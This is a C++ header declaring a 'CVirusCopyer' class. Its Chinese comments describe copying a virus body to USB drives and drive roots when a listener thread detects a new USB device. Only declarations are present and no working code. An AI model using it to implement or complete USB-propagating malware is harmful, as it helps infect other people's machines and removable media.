#pragma once

#include <vector>

using namespace std;

class CVirusCopyer
{
	friend DWORD WINAPI USBListener(LPVOID lpParam);
private:
	vector<char> USBDriveVol;		// the vol of USB drivers
	DWORD threadId;

public:
	CVirusCopyer(void);
	~CVirusCopyer(void);

	//int getUSBDrive(DWORD mask);

	// 根据USBDriveVol的内容，将病毒本体拷贝到USB中 
	//bool copyToUsb();
	// 废弃的函数
	//bool copyToDisk();
protected:
	// 将病毒的本体拷贝到指定的卷标的根目录下
	BOOL copy(TCHAR vol);

	// 以下两个函数分别制定的卷标是否是
	BOOL IsUSBDevice(TCHAR label);
	BOOL IsFixedDevice(TCHAR label);
};

